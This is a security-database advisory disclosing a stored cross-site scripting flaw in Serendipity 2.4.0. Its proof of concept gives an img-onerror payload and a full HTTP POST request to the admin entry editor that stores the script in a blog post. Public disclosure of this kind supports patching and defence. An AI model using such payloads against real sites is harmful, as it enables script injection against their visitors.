---
title: Serendipity 2.4.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023040067
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:32.799197
---

# Serendipity 2.4.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Serendipity 2.4.0 Cross Site Scripting** **2023.04.21**  Credit:  **[Mirabbas Agalarov](https://cxsecurity.com/author/Mirabbas%2BAgalarov/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

Exploit Title: Serendipity 2.4.0 - Cross-Site Scripting (XSS)
Author: Mirabbas Ağalarov
Application: Serendipity
Version: 2.4.0
Bugs: Stored XSS
Technology: PHP
Vendor URL: https://docs.s9y.org/
Software Link: https://docs.s9y.org/downloads.html
Date of found: 13.04.2023
Tested on: Linux
2. Technical Details & POC
========================================
steps:
1.Anyone who has the authority to create the new entry can do this
payload: hello%3Cimg+src%3Dx+onerror%3Dalert%283%29%3E
POST /serendipity/serendipity\_admin.php? HTTP/1.1
Host: localhost
Content-Length: 730
Cache-Control: max-age=0
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/serendipity/serendipity\_admin.php?serendipity[adminModule]=entries&serendipity[adminAction]=new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: serendipity[old\_session]=st6cvq3rea6l8dqgjs1nla6s1b; serendipity[author\_token]=c74c7da50976c82e628d7a8dfdb7c9e3ebc8188b; serendipity[toggle\_extended]=; serendipity[entrylist\_filter\_author]=; serendipity[entrylist\_filter\_category]=; serendipity[entrylist\_filter\_isdraft]=; serendipity[entrylist\_sort\_perPage]=; serendipity[entrylist\_sort\_ordermode]=; serendipity[entrylist\_sort\_order]=; s9y\_6991e531dd149036decdb14ae857486a=st6cvq3rea6l8dqgjs1nla6s1b
Connection: close
serendipity%5Baction%5D=admin&serendipity%5BadminModule%5D=entries&serendipity%5BadminAction%5D=save&serendipity%5Bid%5D=&serendipity%5Btimestamp%5D=1681366826&serendipity%5Bpreview%5D=false&serendipity%5Btoken%5D=ae9b8ae35a756c24f9552a021ee81d56&serendipity%5Btitle%5D=asdf&serendipity%5Bbody%5D=hello%3Cimg+src%3Dx+onerror%3Dalert%283%29%3E&serendipity%5Bextended%5D=&serendipity%5Bchk\_timestamp%5D=1681366826&serendipity%5Bnew\_date%5D=2023-04-13&serendipity%5Bnew\_time%5D=10%3A20&serendipity%5Bisdraft%5D=false&serendipity%5Ballow\_comments%5D=true&serendipity%5Bpropertyform%5D=true&serendipity%5Bproperties%5D%5Baccess%5D=public&ignore\_password=&serendipity%5Bproperties%5D%5Bentrypassword%5D=&serendipity%5Bchange\_author%5D=1
2. visit the entry you created

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040067)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top